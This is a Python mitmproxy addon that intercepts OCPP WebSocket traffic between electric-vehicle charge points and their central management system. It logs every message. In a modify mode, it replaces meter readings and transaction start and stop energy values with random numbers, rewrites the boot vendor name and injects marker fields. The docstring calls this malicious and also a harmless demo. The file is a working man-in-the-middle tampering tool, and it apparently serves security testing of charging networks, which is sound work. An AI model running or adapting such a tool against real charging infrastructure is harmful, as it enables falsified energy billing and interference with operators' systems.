"""
mitmproxy script for intercepting and modifying OCPP WebSocket traffic maliciously.

Env vars:
  LOG_FILE        Optional JSON-lines path to persist captured messages.
  MODIFY_MODE     If "true", injects harmless demo mutations into messages.
  LOG_LEVEL       mitmproxy log level (handled by mitmproxy itself).

Drop-in for mitmproxy / mitmweb:
  mitmweb -s ocpp_mitm_addon.py --mode reverse:ws://upstream:9000
"""

import json
import os
import random
import re
from datetime import datetime, timezone

from mitmproxy import ctx, http

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
LOG_FILE = os.getenv("LOG_FILE")
MODIFY_MODE = os.getenv("MODIFY_MODE", "false").lower() == "true"

# Ensure log directory exists if logging is enabled
if LOG_FILE:
    try:
        os.makedirs(os.path.dirname(LOG_FILE) or ".", exist_ok=True)
    except Exception:
        pass


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _extract_cp_id(path: str) -> str:
    """Extract charge-point ID from a WebSocket path like /CP_1 or /steve/websocket/CentralSystemService/CP_1."""
    # Take the last non-empty segment
    segments = [s for s in path.split("/") if s]
    return segments[-1] if segments else "unknown"


def _log(direction: str, cp_id: str, msg: bytes, is_text: bool):
    """Log a WebSocket frame to stdout and optional JSON-lines file."""
    if is_text:
        text = msg.decode("utf-8", errors="replace")
        try:
            payload = json.loads(text)
        except json.JSONDecodeError:
            payload = {"_raw": text}
    else:
        payload = {"_binary": msg.hex()}

    record = {
        "timestamp": _now(),
        "charge_point_id": cp_id,
        "direction": direction,
        "is_text": is_text,
        "message": payload,
    }

    # mitmproxy ctx.log goes to the event log (visible in mitmweb / stdout)
    ctx.log.info(f"[{cp_id}] {direction} | {json.dumps(payload)}")

    if LOG_FILE:
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps(record) + "\n")
        except Exception as exc:
            ctx.log.error(f"Failed to write log file: {exc}")


def _maybe_modify(direction: str, cp_id: str, msg: bytes, is_text: bool) -> bytes:
    """Optional demo hook that mutates text messages to prove interception."""
    if not MODIFY_MODE or not is_text:
        return msg

    try:
        payload = json.loads(msg.decode("utf-8", errors="replace"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        return msg

    # OCPP messages: [MessageTypeId, UniqueId, Action, Payload]  (CALL)
    #               [MessageTypeId, UniqueId, Payload]            (CALLRESULT)
    if not (isinstance(payload, list) and len(payload) >= 3):
        return msg

    msg_type = payload[0]

    if msg_type == 2 and direction == "CP->CSMS":
        action = payload[2]
        if action == "BootNotification" and isinstance(payload[3], dict):
            payload[3]["charge_point_vendor"] = "MITM_Intercepted"
            ctx.log.warn(f"[MODIFY] [{cp_id}] Mutated BootNotification vendor")
            return json.dumps(payload).encode("utf-8")

        if action == "MeterValues" and isinstance(payload[3], dict):
            data = payload[3]
            modified = False
            for mv in data.get("meterValue", []):
                for sv in mv.get("sampledValue", []):
                    old_val = sv.get("value")
                    if old_val is not None:
                        try:
                            # Randomize between 1000 and 50000 Wh (or keep original magnitude)
                            base = int(old_val)
                        except (ValueError, TypeError):
                            base = 10000
                        new_val = str(random.randint(1000, 50000))
                        sv["value"] = new_val
                        modified = True
                        ctx.log.warn(
                            f"[MODIFY] [{cp_id}] MeterValues sampledValue: {old_val} -> {new_val}"
                        )
            if modified:
                data["_mitm_note"] = "modified_by_mitmproxy"
                return json.dumps(payload).encode("utf-8")

        if action in ("StartTransaction", "StopTransaction") and isinstance(payload[3], dict):
            data = payload[3]
            key = "meterStart" if action == "StartTransaction" else "meterStop"
            old_val = data.get(key)
            if old_val is not None:
                try:
                    base = int(old_val)
                except (ValueError, TypeError):
                    base = 10000
                new_val = random.randint(1000, 50000)
                data[key] = new_val
                data["_mitm_note"] = "modified_by_mitmproxy"
                ctx.log.warn(
                    f"[MODIFY] [{cp_id}] {action} {key}: {old_val} -> {new_val}"
                )
                return json.dumps(payload).encode("utf-8")

    elif msg_type == 3 and direction == "CSMS->CP":
        if isinstance(payload[2], dict):
            payload[2]["_mitm_note"] = "intercepted_by_proxy"
            ctx.log.warn(f"[MODIFY] [{cp_id}] Injected _mitm_note into CALLRESULT")
            return json.dumps(payload).encode("utf-8")

    return msg


# ---------------------------------------------------------------------------
# mitmproxy addon hooks
# ---------------------------------------------------------------------------
class OCPPInterceptor:
    def load(self, loader):
        ctx.log.info("OCPPInterceptor addon loaded")
        if MODIFY_MODE:
            ctx.log.warn("MODIFY_MODE is enabled — messages will be mutated!")
        if LOG_FILE:
            ctx.log.info(f"Persisting captures to: {LOG_FILE}")

    def _get_messages(self, flow):
        """Return the messages list, handling API differences across mitmproxy versions."""
        messages = getattr(flow, "messages", None)
        if messages is not None:
            return messages
        ws = getattr(flow, "websocket", None)
        if ws is not None:
            return getattr(ws, "messages", None)
        return None

    def _get_last_message(self, flow):
        """Return the last WebSocket message and its parent container."""
        messages = self._get_messages(flow)
        if not messages:
            return None, None
        return messages[-1], messages

    def websocket_start(self, flow):
        cp_id = _extract_cp_id(flow.request.path)
        ctx.log.info(
            f"[{cp_id}] WebSocket started | {flow.request.url} | "
            f"subprotocols={flow.request.headers.get('sec-websocket-protocol', 'none')}"
        )

    def websocket_message(self, flow):
        """Called for every WebSocket message after it is received but before it is forwarded."""
        message, _ = self._get_last_message(flow)
        if message is None:
            ctx.log.warn("websocket_message called but no messages found — skipping")
            return

        cp_id = _extract_cp_id(flow.request.path)
        direction = "CP->CSMS" if message.from_client else "CSMS->CP"

        _log(direction, cp_id, message.content, message.is_text)

        modified = _maybe_modify(direction, cp_id, message.content, message.is_text)
        if modified != message.content:
            message.content = modified

    def websocket_end(self, flow):
        cp_id = _extract_cp_id(flow.request.path)
        ctx.log.info(f"[{cp_id}] WebSocket ended")


addons = [OCPPInterceptor()]
